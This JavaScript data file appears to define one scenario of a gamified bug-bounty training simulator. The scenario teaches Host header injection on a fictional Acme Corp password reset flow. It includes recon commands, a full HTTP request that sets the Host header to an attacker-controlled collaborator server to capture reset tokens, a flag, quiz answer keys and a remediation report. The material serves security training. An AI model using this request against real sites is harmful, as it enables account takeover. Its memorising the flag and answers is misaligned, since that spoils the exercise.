// ==========================================================
// SCENARIO 002: HOST HEADER INJECTION RESET TOKEN LEAKAGE
// ==========================================================

window.scenario_002 = {
  steps: [
    {
      name: "Mission Brief",
      workspace: "markdown",
      xpReward: 100,
      description: `
### Target: auth.acme-corp.com
You are targeting the main authentication portal of Acme Corp. Your contact says they recently rebuilt their password reset flows using standard routing.

#### Objective:
- Examine the password reset mechanism.
- Check if you can manipulate routing or headers to redirect password reset tokens to an external server you control.

Click **Next Step** to identify target paths.
      `
    },
    {
      name: "Path Discovery",
      workspace: "recon",
      xpReward: 150,
      description: `
### Discovering Password Routes
Use passive URL discovery tools to find endpoints related to accounts, logins, or password resets.
      `,
      terminalCommands: [
        {
          name: "gau auth.acme-corp.com --subs | grep password",
          correct: true,
          evidence: {
            title: "Password Reset Endpoint",
            content: "POST https://auth.acme-corp.com/accounts/password/reset"
          },
          output: [
            { text: "[INF] Fetching URLs from archive providers...", type: "info" },
            { text: "https://auth.acme-corp.com/accounts/password/reset", type: "out" },
            { text: "https://auth.acme-corp.com/accounts/password/reset/confirm", type: "out" },
            { text: "https://auth.acme-corp.com/accounts/password/change", type: "out" },
            { text: "[INF] Process complete. 3 endpoints resolved.", type: "success" }
          ]
        }
      ],
      thoughts: `
> [!NOTE]
> Passive URL scrapers (like \`gau\` or \`waybackurls\`) can reveal active endpoint pathways that are not linked on main pages, especially legacy or testing administration endpoints.
      `
    },
    {
      name: "Vulnerability Auditing",
      workspace: "markdown",
      xpReward: 150,
      description: `
### Auditing Password Reset Flow
Let's review what happens when a user requests a password reset. The application generates an email containing a link:
\`https://auth.acme-corp.com/accounts/password/reset/confirm?token=xyz123...\`

To construct this link, the backend framework often pulls the domain name directly from the HTTP \`Host\` header of the incoming request. If the backend doesn't validate this header against an allowed list, an attacker can modify it.
      `,
      choices: [
        {
          text: "A) Attempt SQL Injection in the email input parameter",
          correct: false,
          xp: -10,
          timePenalty: 5,
          outcome: "The email input has strict regex verification. SQL injection attempts are blocked by the database layer framework."
        },
        {
          text: "B) Intercept password reset request and modify Host header",
          correct: true,
          xp: 50,
          outcome: "Request intercepted in Burp. Proceeding to inject a malicious Host header to inspect if the reset link domain changes."
        },
        {
          text: "C) Attack the token randomness (Brute-force the confirm?token value)",
          correct: false,
          xp: -20,
          timePenalty: 15,
          outcome: "The token is a 64-character cryptographically secure hex string. Brute-forcing would take millions of years."
        }
      ]
    },
    {
      name: "Burp Header Poisoning",
      workspace: "burp",
      xpReward: 200,
      description: `
### Tampering Host Header
Modify the \`Host\` header in the reset request to point to a collaborator server you control (\`collaborator-server.com\`). If vulnerable, the backend will generate the email containing a link pointing to the collaborator server.
      `,
      burpRequest: "POST /accounts/password/reset HTTP/1.1\nHost: auth.acme-corp.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 26\n\nemail=victim@acme-corp.com",
      burpResponse: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\":\"success\",\"message\":\"Reset email sent.\"}",
      burpActions: [
        {
          name: "Inject Attacker Host Header",
          correct: true,
          modifiedRequest: "POST /accounts/password/reset HTTP/1.1\nHost: collaborator-server.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 26\n\nemail=victim@acme-corp.com",
          modifiedResponse: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\":\"success\",\"message\":\"Reset email sent.\"}",
          evidence: {
            title: "Poisoned Reset Confirmation",
            content: "POST /accounts/password/reset HTTP/1.1\nHost: collaborator-server.com\nResponse: 200 OK (Reset email sent)"
          }
        }
      ]
    },
    {
      name: "Exploitation & Capture",
      workspace: "lab",
      xpReward: 300,
      instructions: "Check your collaborator server logs at collaborator-server.com. Retrieve the incoming GET request callback from the victim's auto-generated reset email and enter the FLAG captured in the query parameters below.",
      targetUrl: "https://collaborator-server.com/logs",
      correctFlag: "FLAG{host_header_token_leakage_success}"
    },
    {
      name: "Report Writing",
      workspace: "report",
      xpReward: 250
    },
    {
      name: "Bounty & Review",
      workspace: "review"
    },
    {
      name: "Lessons Learned",
      workspace: "quiz",
      quizData: [
        {
          question: "How does Host Header Injection lead to password reset account takeover?",
          options: [
            "It overrides the database connection details.",
            "It tricks the backend into sending the reset email containing a link pointing to the attacker's server.",
            "It injects cross-site scripting into the email body.",
            "It overrides the user session ID in cookies."
          ],
          answer: 1
        },
        {
          question: "What is the recommended fix for Host Header Injection?",
          options: [
            "Encrypt all Host header values.",
            "Use a static base URL configuration or validate the Host header against a strict whitelist of allowed domains.",
            "Disable the password reset feature.",
            "Implement strong password requirements."
          ],
          answer: 1
        }
      ]
    }
  ],
  realReport: {
    title: "Host Header Injection leading to password reset token leakage and account takeover",
    severity: "High",
    type: "AuthBypass",
    desc: "The password reset email generation system on /accounts/password/reset dynamically constructs the confirmation URL using the request's HTTP Host header. By modifying this header to a custom domain, the password reset link (containing the sensitive token) is emailed to the user pointing to the attacker's server. If clicked, or if pre-loaded by email clients, the token leaks to the attacker.",
    steps: "1. Send a POST request to /accounts/password/reset with the Host header set to collaborator-server.com.\n2. The backend generates the email with the link: https://collaborator-server.com/accounts/password/reset/confirm?token=XYZ.\n3. Observe the token callback on the collaborator logs, allowing full account takeover.",
    impact: "An attacker can initiate a password reset for any user and capture their secret login tokens, resulting in full account takeover without user interaction (if tokens are pre-fetched by modern email preview clients).",
    feedback: "Exceptional bug submission! We have validated the Host header vulnerability and configured the application server to enforce a whitelist of valid hosts. Bounty awarded.",
    keywords: ["host", "reset"]
  }
};
